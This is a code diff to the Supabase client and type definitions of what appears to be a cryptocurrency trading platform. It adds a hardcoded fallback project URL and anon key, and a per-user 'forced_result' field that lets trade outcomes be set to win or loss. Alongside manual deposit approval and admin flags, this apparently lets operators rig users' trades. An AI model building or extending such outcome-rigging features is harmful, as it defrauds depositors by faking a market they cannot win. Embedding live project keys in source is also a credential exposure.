@@ -1,11 +1,10 @@
 import { createClient } from '@supabase/supabase-js';
 
-const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
-const supabaseAnonKey = import.meta.env.VITE_SUPABASE_ANON_KEY;
-
-if (!supabaseUrl || !supabaseAnonKey) {
-  throw new Error('Missing Supabase environment variables');
-}
+// Public credentials — safe to hardcode (Vite VITE_ vars are always client-side)
+const supabaseUrl = import.meta.env.VITE_SUPABASE_URL
+  || 'https://xwtnkxvvxozgjddwrvon.supabase.co';
+const supabaseAnonKey = import.meta.env.VITE_SUPABASE_ANON_KEY
+  || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh3dG5reHZ2eG96Z2pkZHdydm9uIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzMwMzk4NDgsImV4cCI6MjA4ODYxNTg0OH0.GvQxippdZsDAvK_sdxOucSDodrmDO5Op0DSAXxbLi-I';
 
 export const supabase = createClient(supabaseUrl, supabaseAnonKey);
 
@@ -19,12 +18,13 @@ export type Profile = {
   username: string | null;
   avatar_url: string | null;
   is_admin: boolean;
-  btc_balance: number | string;
-  eth_balance: number | string;
-  usdc_balance: number | string;
-  usdt_balance: number | string;
-  xrp_balance: number | string;
-  sol_balance: number | string;
+  forced_result: 'win' | 'loss' | null;
+  btc_balance: number;
+  eth_balance: number;
+  usdc_balance: number;
+  usdt_balance: number;
+  xrp_balance: number;
+  sol_balance: number;
   kyc_status: 'not_verified' | 'pending' | 'verified';
   created_at: string;
   updated_at: string;
@@ -49,7 +49,7 @@ export type Deposit = {
   id: string;
   user_id: string;
   amount: number;
-  network: 'TRC20' | 'ERC20' | 'ETH';
+  network: 'TRC20' | 'ERC20' | 'ETH' | 'BTC';
   proof_url: string;
   status: 'pending' | 'approved' | 'rejected';
   created_at: string;
@@ -92,7 +92,7 @@ export type Transaction = {
   type: 'deposit' | 'withdrawal' | 'trade' | 'swap';
   amount: number;
   currency: string;
-  status: string;
-  details: any;
+  status: 'pending' | 'win' | 'loss' | 'approved' | 'rejected';
+  details: Record<string, unknown>;
   created_at: string;
 };
